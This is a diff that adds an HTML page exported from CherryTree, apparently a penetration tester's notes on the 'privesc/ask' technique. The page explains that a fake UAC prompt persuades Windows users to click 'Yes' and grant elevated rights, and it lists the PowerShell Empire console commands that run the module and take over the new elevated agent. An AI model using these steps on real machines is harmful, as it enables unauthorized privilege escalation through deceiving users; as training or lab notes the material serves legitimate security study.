@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>privesc/ask</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>privesc/ask</h1><br/><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb</a><br />It simply pops up a UAC prompt, asking a user logged in to Windows for permission to execute a program.<br />While that might alert a diligent user, most users will simply click “Yes”. Although there are other exploits to bypass UAC, Microsoft patches them regularly. But, a simple “Yes” click by a user works very well, even on a fully patched Windows box. <br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; usemodule privesc<span style="color:#ff9d00;font-weight:700">/</span>ask<br /><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; <span style="color:#ff9d00;font-weight:700">info</span><br /><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; <span style="color:#ff9d00;font-weight:700">set</span> Listener [custom-listener]<br /><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; execute</pre></div><br />    <a href=""><img src="images/1103-1.png" alt="images/1103-1.png" /></a><br />    <a href=""><img src="images/1103-2.png" alt="images/1103-2.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; back<br /><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; interact[new-agent]   <span style="color:#0088ff;font-weight:400">#in the example above the new agent is D143XBCM</span><br /><span style="color:#ff9d00;font-weight:700">(</span>Empire<span style="color:#ff9d00;font-weight:700">)</span>&gt; sysinfo</pre></div><br />    <a href=""><img src="images/1103-3.png" alt="images/1103-3.png" /></a></div>
+</body>
+</html>
